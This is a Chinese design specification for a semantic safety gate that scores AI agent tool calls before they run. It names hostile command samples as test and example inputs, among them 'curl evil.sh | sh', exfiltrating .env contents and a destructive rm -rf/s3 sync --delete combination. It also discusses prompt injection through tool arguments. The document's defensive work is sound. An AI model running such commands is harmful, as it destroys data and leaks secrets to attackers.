# tool_risk_gate —— 工具调用安全门控 · 详细设计

> 版本：v1.0（独立详设）
> 日期：2026-09-28
> 对应总体设计：`docs/design/jev_mcp_design.md` §4.7（本文件是其扩展与修订升级）
> 依据：`docs/research/jev-api-docs.md`（agent/risk 端点语义、token 预算、错误码）、`AGENTS.md`「jev 工具开发原则」17 条
> 实现后端：jev 现成端点 `POST /api/v1/agent/risk`（薄封装；问题措辞固化在 jev 服务端，本服务负责校验、阈值映射与 fail-closed）

---

## 1. 场景与问题

### 1.1 场景

agent 在执行工具调用前，框架需要判断该调用的**语义风险**：直接放行、要求人工/上层确认，还是直接拦截。确定性的规则引擎（命令黑名单、路径白名单）只能匹配已知模式，对「`rm -rf ./dist && aws s3 sync … s3://prod --delete` 组合起来指向生产环境」「把文件内容 curl 到陌生域名」这类**组合后才有风险**的语义问题无能为力。

本工具回答一个问题：**这一次工具调用，应该 allow / review / block？**

### 1.2 框架现状（以 SproutHarness 为参照，工具签名保持框架无关）

- SproutHarness 的 `sandbox/security` 是**确定性规则层**：黑名单命令、路径白名单等，只能覆盖已知危险模式；语义级风险（参数组合、数据外发意图、上下文中的生产环境指向）不在其能力内。
- 计划接入点：`TOOL_BEFORE_EXECUTE` hook。**规则层先行（确定性拦截），jev 门控殿后（语义兜底），二者互补而非替代**——规则能拦的不花 token，规则拦不住的交给 jev。
- 工具签名只有 `goal / tool / arguments / context` 四个语义字段，不含任何 SproutHarness 专有概念；任何 harness 在自己的工具执行前 hook 中调用即可。

### 1.3 误判代价不对称（本工具的核心设计驱动力）

| 误判方向 | 后果 | 代价 |
|---|---|---|
| 误放行（false allow） | 破坏性/不可逆/数据外泄操作被执行 | **极高** |
| 误拦截（false block / 多余 review） | 正常操作被打断或转人工，体验受损 | 低 |

因此：默认阈值**偏保守**——allow 区间收窄（`risk_allow_max=0.3`），中间宽带留给 review；一切证据不完整的情形（响应畸形、输入截断、confidence 不足）一律向严格方向降级，**绝不自动放行**。

### 1.4 能力边界

- jev **只判断不执行**：本工具返回风险分、风险类别与建议 verdict，执行与降级策略（如 hook 的 fail-open）由调用方决定（原则 14）。
- 本工具不做参数改写、命令解析、沙箱配置——那些是框架侧规则层与执行层的职责（原则 2）。

---

## 2. 工具签名

### 2.1 输入

```json
{
  "goal": "清理构建产物并部署到生产",
  "tool": "bash",
  "arguments": "rm -rf ./dist && aws s3 sync ./build s3://prod --delete",
  "context": "CI 部署步骤（可选）",
  "risk_allow_max": 0.3,
  "risk_block_min": 0.7,
  "confidence_min": 0.4,
  "arguments_max_chars": 16000
}
```

| 字段 | 类型 | 必填 | 默认 | 说明 |
|---|---|---|---|---|
| `goal` | string | 是 | — | 当前任务目标原文，供 jev 判断调用意图（同样的 `rm -rf` 在"清理构建目录"与"系统维护"下风险不同） |
| `tool` | string | 是 | — | 工具名（如 `bash`、`write_file`） |
| `arguments` | string | 是 | — | 工具参数序列化文本。超长时按 `arguments_max_chars` 头部截断并标记 `truncated` |
| `context` | string | 否 | 缺省不发送 | 附加上下文（如在 CI 中、在沙箱内、用户已预授权） |
| `risk_allow_max` | float ∈ [0,1] | 否 | `0.3` | risk < 此值才可能 verdict=allow。默认偏低，体现误判代价不对称（原则 11：默认值只是起点，接入方按数据调校） |
| `risk_block_min` | float ∈ [0,1] | 否 | `0.7` | risk ≥ 此值则 verdict=block（无论 jev action 为何）。必须 > `risk_allow_max` |
| `confidence_min` | float ∈ [0,1] | 否 | `0.4` | jev confidence 低于此值时 verdict 向严格方向升一级 |
| `arguments_max_chars` | int | 否 | `16000` | `arguments` 防御性截断上限（字符数，头部保留） |

### 2.2 输出

```json
{
  "verdict": "block",
  "jev_action": "block",
  "risk": 0.84,
  "categories": ["destructive", "irreversible", "external_side_effect", "data_exposure"],
  "confidence": 0.6,
  "truncated": false,
  "thresholds": {"risk_allow_max": 0.3, "risk_block_min": 0.7, "confidence_min": 0.4},
  "model": "jev-1.13.0",
  "usage": {"input_tokens": 61, "cost_usd": 0.0000256, "credits_remaining_usd": 4.9999744},
  "error": null
}
```

| 字段 | 类型 | 说明 |
|---|---|---|
| `verdict` | enum | 本服务建议动作：`allow` / `review` / `block` / `invalid_response`。工具只建议不执行（原则 14） |
| `jev_action` | string / null | jev 端点原始返回的 `allow`/`confirm`/`block`，原样透传便于审计；`invalid_response` 时为 null |
| `risk` | float / null | jev 返回的 0–1 风险分，原样透传 |
| `categories` | array | 风险类别数组（如 `destructive`、`irreversible`、`external_side_effect`、`data_exposure`），原样透传；供框架侧做类别级策略（如对 `data_exposure` 一律转人工） |
| `confidence` | float / null | jev 对该判断的置信度 |
| `truncated` | bool | `arguments` 是否被防御性截断；为 true 时 verdict **绝不返回 allow**（原则 12） |
| `thresholds` | object | **回显本次实际使用的阈值**（含默认值填充），供日志与离线调校对照（原则 11） |
| `model` | string | 实际解析的 jev 模型版本（响应透传） |
| `usage` | object | jev 返回的完整 usage 块原样透传：`input_tokens` / `cost_usd` / `credits_remaining_usd` |
| `error` | object / null | 失败时的结构化错误 `{code, message, retryable}`；transport 错误与响应校验失败都走这里 |

---

## 3. jev 归约

### 3.1 实现后端：现成端点薄封装（与自研 /decide 工具的差异）

本工具**不调 `/v1/decide`**，而是调用 jev 现成语义端点：

```
POST {JEV_BASE_URL}/api/v1/agent/risk
```

端点内部是 jev 服务端固化的问题集（instructions / criteria 对本服务**不可见、不可配置**），返回固定结构 `{action, risk, categories, confidence}`。本文档不虚构其措辞。

「薄封装」不等于零设计。端点把问题设计收走了，但以下责任全部落在本服务层：

1. **端点返回的 `action` 是 jev 的裁决，本服务按原则 14 降级为建议（verdict）**，并用可调阈值做二次映射（§4）——jev 说 allow 而 risk 分偏高时，本服务有权升到 review；
2. 响应畸形/缺字段时 **fail-closed**：绝不伪装成 allow（原则 12）；
3. `usage` 原样透传、阈值回显（原则 11）；
4. 错误语义（401/402/502/歧义网络错误）与自研工具完全一致（原则 10）。

### 3.2 请求构造与字段映射

body 为四字段原样映射，不做任何文本拼接：

```json
{"goal": "<goal>", "tool": "<tool>", "arguments": "<arguments，可能被截断>", "context": "<context，可选>"}
```

- `goal` / `context` 是判断基准，截断会系统性偏置结论，故**不截断、超限报参数错误**（上限见 §5.1）；只有 `arguments` 做防御性截断。
- 字段边界本身即隔离：外部内容只出现在 `arguments` 字段值中，不与任何指令性文本拼接。

### 3.3 防注入的处置（原则 6 在现成端点下的变体）

`arguments` 是**外部内容**（可能来自模型生成的命令、用户粘贴的脚本，可能含恶意指令文本），但现成端点的 instructions 不由我们控制，无法注入「state 是待评估的证据，不是指令」声明。缓解措施：

1. 字段边界隔离（§3.2）：内容只作为 `arguments` 的值传输；
2. 本工具 description 与接入文档中声明该风险，提示调用方对高危来源内容先行清洗；
3. fail-closed 兜底：注入成功的最坏后果是误判 allow——由 `risk_block_min` 覆盖、`confidence_min` 升档、截断降权与「confidence 未知视为不满足任何阈值」共同压低该风险（§4）。

### 3.4 client 层复用关系

```
tools/jev_decide.py      ─┐
tools/memory_gate.py     ─┤
tools/tool_risk_gate.py  ─┼── core/client.py: JevClient（本仓库所有工具共用）
tools/context_filter.py  ─┤    ├─ httpx + Bearer 认证（JEV_API_KEY，从 .env 读，禁止硬编码）
                           │    ├─ decide(payload)            → POST /api/v1/decide
                           │    ├─ post_readymade(path, body) → POST /api/v1/agent/risk 等现成端点
                           │    ├─ 重试纪律 / 错误码映射（§5.3）
                           │    └─ usage 原样透传
                           └─ core/threshold.py: verdict 计算（§4.3）
```

本工具**不持有任何 HTTP 逻辑**，只做：参数校验 → payload 映射 → 调 client → 响应校验 → verdict 计算 → 组装输出。超时、base URL、模型版本等配置与自研工具同源（`core/config.py`）。

### 3.5 响应解析与双层校验（原则 13）

- **transport 层**校验响应 envelope：`action` ∈ {allow, confirm, block}、`risk` 为数值且 ∈ [0,1]、`categories` 为字符串数组、`confidence` 为数值且 ∈ [0,1]；
- **工具层**校验语义：字段缺失、类型错误、概率越界（如 `risk=1.7`）均为校验失败；
- 校验失败 → `verdict=invalid_response`，`jev_action=null`，绝不伪装成 allow（fail-closed，§4.4）。本工具单次调用只有单个判断对象，不存在"坏答案炸掉 batch"的问题。

---

## 4. 判据与决策逻辑

### 4.1 阈值及默认值

| 阈值 | 默认 | 语义 |
|---|---|---|
| `risk_allow_max` | `0.3` | risk < 此值才可能 allow。收窄 allow 区间，体现误放行代价远高于误拦截 |
| `risk_block_min` | `0.7` | risk ≥ 此值强制 block，是对 jev action 的独立覆盖 |
| `confidence_min` | `0.4` | confidence 低于此值升一档（allow→review） |

约束：`0 ≤ risk_allow_max < risk_block_min ≤ 1`，违反则返回参数错误，**不发请求**。

### 4.2 margin 判据（原则 5 的适用性说明）

**不适用。** margin 是 choice 类决策的第二判据（冠亚军概率差），现成端点不暴露选项概率分布，无冠亚军差值可算——这是薄封装相对自研 choice 问题的信息损失，用 `confidence_min` 升档机制近似补偿：jev 自己报告没把握时，本服务不自动放行。

### 4.3 verdict 计算规则（`core/threshold.py`，确定性、可单测）

输入信号：jev `action`、`risk`、`confidence`，及本地 `truncated` 标志。按序计算：

1. **fail-closed 前置**：响应校验失败 → `verdict=invalid_response`；
2. **截断降权**：`truncated=true` → 后续结果封顶 `review`；
3. **action 基线**：allow→`allow`，confirm→`review`，block→`block`；
4. **risk 覆盖**：`risk ≥ risk_block_min` → `block`；`risk ≥ risk_allow_max` → 至少 `review`；`risk < risk_allow_max` 且基线为 allow → 维持 `allow`。取基线与 risk 推得结果的**较严格者**；
5. **confidence 升档**：`confidence < confidence_min` 或 confidence 缺失 → 向严格方向升一级（allow→review；review/block 不变）。

真值表（未截断、响应合法时）：

| jev action | risk | confidence | verdict |
|---|---|---|---|
| allow | < 0.3 | ≥ 0.4 | `allow` |
| allow | < 0.3 | < 0.4 | `review` |
| allow | [0.3, 0.7) | 任意 | `review` |
| allow / confirm | ≥ 0.7 | 任意 | `block` |
| confirm | < 0.3 | 任意 | `review` |
| block | 任意 | 任意 | `block` |

### 4.4 fail-closed 行为（原则 12）

- **缺失/畸形响应** → `invalid_response`，绝不伪装成 allow；
- **risk / confidence 缺失或越界**视为未知，未知视为不满足任何 allow 条件；
- **截断输入永不自动放行**：`truncated=true` 时 verdict 上限为 `review`——被截断的 arguments 意味着 jev 没看全命令，"无风险"的结论不可信；
- HTTP 层错误（重试耗尽、不可重试错误）→ 不输出 verdict，返回结构化 `error`，由调用方按自身降级策略处理。

### 4.5 框架侧处置建议（工具只建议不执行，原则 14）

| verdict | 建议动作 | 说明 |
|---|---|---|
| `allow` | 放行执行 | 仍可叠加框架自身的规则层与配额 |
| `review` | 转人工/上层确认 | SproutHarness 可接入现有权限确认流 |
| `block` | 拦截 | 返回 `categories` 帮助用户理解原因 |
| `invalid_response` / HTTP 错误 | 由调用方降级策略决定 | 文档层面建议：按 hook 配置 fail-open（回退纯规则层）或 fail-closed（一律转确认），避免 jev 故障阻塞主流程；选择权属调用方 |

---

## 5. 边界与错误处理

### 5.1 规模上限与截断

| 输入 | 上限 | 超限行为 |
|---|---|---|
| `goal` / `context` | 各 ≤ 4000 字符 | 返回参数错误，**不静默截断**（goal/context 是判断基准，截断会系统性偏置结论） |
| `tool` | ≤ 200 字符 | 参数错误 |
| `arguments` | ≤ `arguments_max_chars`（默认 16000，可调） | 头部保留截断 + `truncated=true`，verdict 封顶 review |

发送前做保守 token 估算（原则 9，按字符类别计价，故意高估留安全边际）：

```
est_tokens(text) = ceil(ascii_chars / 3) + non_ascii_chars * 1
```

估算 > 30k（32k 单问题预算留 2k 安全边际）→ 不发请求，返回结构化错误 `input_too_large`。本工具**不分批**：单次调用只有一个判断对象，超限由截断 + `truncated` 标记或报错处理。

### 5.2 上游 max_tokens_exceeded

上游返回 400 `max_tokens_exceeded` 视为本服务估算偏差的 bug：记录告警、原样透传 jev `error` 字段，不重试。

### 5.3 错误码矩阵（原则 10：重试纪律）

| 情况 | 处理 | 重试 |
|---|---|---|
| 400 | 原样透传 jev `error` 字段（多为请求构造问题，需可排查） | 否 |
| 401 | key 缺失/无效/吊销，返回结构化错误 | 否 |
| 402 | 余额不足，返回 `{code: "insufficient_credits", credits_remaining_usd}`，**立即返回不消耗重试配额**；调用方应告警充值，本服务不做任何降级放行 | 否 |
| 403 | 账户未激活 | 否 |
| 408 / 429 / 5xx（含 502） | 指数退避 + jitter（默认最多 3 次：1s / 2s / 4s + 0–25% jitter）；这些是"确定未被处理"的响应。耗尽后返回 `{code: "upstream_unavailable", retries: 3}` | 是 |
| 连接重置、TLS 失败、连接中断等歧义网络错误 | **绝不重发**——付费调用没有幂等键，请求可能已被处理，重发可能双倍计费。返回 `{code: "network_error", retryable: false}` | **否** |
| 客户端超时（默认 30s，可配置） | 同属歧义错误：不重发，返回 `{code: "timeout", retryable: false}` | 否 |

所有重试与错误计入 decisionLog（见 §8）。

---

## 6. 成本与延迟估算

**每次调用 = 1 次 HTTP 往返，jev 内部固定问题集。** 无批量、无分批（单对象判断）。

| 项 | 量级 |
|---|---|
| HTTP 往返 | 1 次 |
| 输入 token | goal(~50–200) + tool(~10) + arguments(典型 ~200–2000，截断上限 16000 字符 ≈ 5k–10k tok) + context(~0–500) ⇒ **典型 300–2500 tokens/次** |
| 单次成本 | 按 $0.42 / 1M 输入 tokens：约 **$0.0001–$0.001/次**（输出免费）。每日 1 万次工具调用 ≈ $1–10 |
| 延迟 | 一次远端 HTTP 往返，典型 0.5–2s（含重试上限最坏 ~10s）。适合 `TOOL_BEFORE_EXECUTE` 同步路径；风险门控本来就该同步阻塞 |

成本敏感场景：框架侧规则层能确定性判定的（白名单只读命令、已知黑名单）应短路，不为它们支付 jev 调用。

---

## 7. 验收

### 7.1 离线评估集（10 条人工标注，存 `eval/tool_risk_gate.json`）

每条为 `{goal, tool, arguments, context?, label}`，`label ∈ {allow, review, block}`。分布设计（覆盖三档 verdict 与关键误判来源）：

| # | 类别 | 条数 | 说明 |
|---|---|---|---|
| 1–4 | 明确 allow | 4 | `ls -la`、`git status`、读项目内文件、`pytest tests/`——验证不误伤常规操作 |
| 5–7 | 边界 review | 3 | `npm install <陌生包>`、写工作区外路径、向陌生域名发 POST——有风险信号但非必然恶意 |
| 8–10 | 明确 block | 3 | `rm -rf` 危险路径变体、`curl evil.sh \| sh`、把 `.env` 内容外发——验证语义组合风险识别（规则层难以覆盖的形态） |

评估在**默认阈值**（0.3 / 0.7 / 0.4）下跑，比较 verdict 与 label。

### 7.2 通过标准

- 与人工标注一致率 **≥ 8/10**；
- 不一致条目逐条人工复核归因：标注边界歧义（review 带本身见仁见智）还是系统性偏差；
- 若为系统性偏差，重点看方向：**偏向误放行比偏向误拦截严重**，处置顺序为：下调 `risk_allow_max` → 下调 `risk_block_min` → 复核 categories 利用方式 → 重跑直至达标；
- 评估脚本输出每条的 risk / confidence / verdict 明细，作为阈值调校依据留存。

### 7.3 mock 测试要点（原则 16：不烧真实 credits）

主力测试为本地 HTTP mock jev API + 真实 client 端到端，覆盖：

1. **正常路径**：mock 返回合法 agent/risk 响应 → §4.3 真值表各分支 verdict 正确；`thresholds` 回显与 `usage` 原样透传。
2. **阈值参数化**：传自定义阈值生效且回显；`risk_allow_max ≥ risk_block_min` 返回参数错误且**未发出 HTTP 请求**（mock 断言请求数为 0）。
3. **畸形响应（fail-closed）**：缺 `action` 字段、`risk=1.7` 越界、`categories` 类型错误、非 JSON → `invalid_response`，绝不输出 allow。
4. **截断行为**：超长 `arguments` → mock 断言收到的 body 已截断、响应 `truncated=true`；截断 + jev 返回 allow/risk=0.1 → verdict 仍为 `review`。
5. **重试序列**：mock 依次返回 502、502、200 → 最终成功且恰好 3 次请求；连续 502 → 3 次后报 `upstream_unavailable`。
6. **不重试路径**：401/402/403 → 单次请求即报错；402 返回 `insufficient_credits`；模拟连接重置 → 报错且 mock 断言**请求数恰为 1**（绝不重发）。
7. **hang 模拟**：mock 挂起超客户端超时 → 返回 `timeout` 且不重发。

真实 API 仅用于手动连通验证与可选 e2e，不进 CI。

---

## 8. 可观测性（原则 17）

### 8.1 decisionLog 字段清单（每次决策一条）

| 字段 | 说明 |
|---|---|
| `ts` | 决策时间（ISO8601） |
| `request_id` | 服务端生成的本次调用 id，贯穿重试 |
| `tool` | 固定 `"tool_risk_gate"` |
| `model` | 实际解析的 jev 模型版本 |
| `tool_name` | 被门控的工具名（如 `bash`） |
| `input_digest` | `{goal_chars, arguments_chars, context_chars}` 输入长度 + arguments 哈希；**不记原文**，避免日志携带敏感命令与参数 |
| `truncated` | bool |
| `jev_action` / `risk` / `confidence` / `categories` | jev 原始返回 |
| `thresholds` | 实际使用的 `{risk_allow_max, risk_block_min, confidence_min}` |
| `verdict` | 最终判定 |
| `usage` | `{input_tokens, cost_usd, credits_remaining_usd}` |
| `latency_ms` | 端到端耗时（含重试） |
| `http_status` / `retries` | 状态码与重试次数（错误归因） |
| `error` | 失败时的 `{code, message}`，成功为 null |

### 8.2 stats（可聚合输出）

服务暴露按时间窗聚合的 stats，供阈值调校与成本核算：

- `calls_total` / `calls_by_verdict`：verdict 分布——`review` 占比过高说明阈值过紧或置信度升档过激；`allow` 占比需结合 `risk_histogram` 复核；
- `risk_histogram` / `confidence_histogram`：检查大量样本是否挤在阈值附近（阈值敏感区，需重点调校）；
- `categories_count`：风险类别分布，供框架决定是否启用类别级策略；
- `cost_usd_total` / `input_tokens_total` / `cost_per_call_avg`；
- `latency_p50` / `latency_p95`；
- `invalid_response_rate` / `error_rate_by_code` / `retry_rate` / `truncated_rate`：`invalid_response_rate > 1%` 应触发对端点响应格式的复核。

---

## 附：与总体设计 §4.7 的差异说明

本详设在 §4.7 基础上做了以下升级，不改变其结论：

1. §4.7 仅约定字段映射（`{goal, tool, arguments, context}` → `{action, risk, categories}`）；本详设补齐 verdict 二次映射（risk 阈值覆盖 + confidence 升档 + 截断降权），jev 的 `confirm` 统一映射为 `review`；
2. 输出增加 `verdict` / `truncated` / `thresholds` 回显 / 完整 `usage` / 结构化 `error`；
3. 补齐 fail-closed 行为、错误码重试纪律、token 预算预检、评估集分布与可观测性字段；
4. 明确 client 层复用关系：与自研 `/decide` 工具共用 `JevClient`，本工具无独立 HTTP 逻辑。
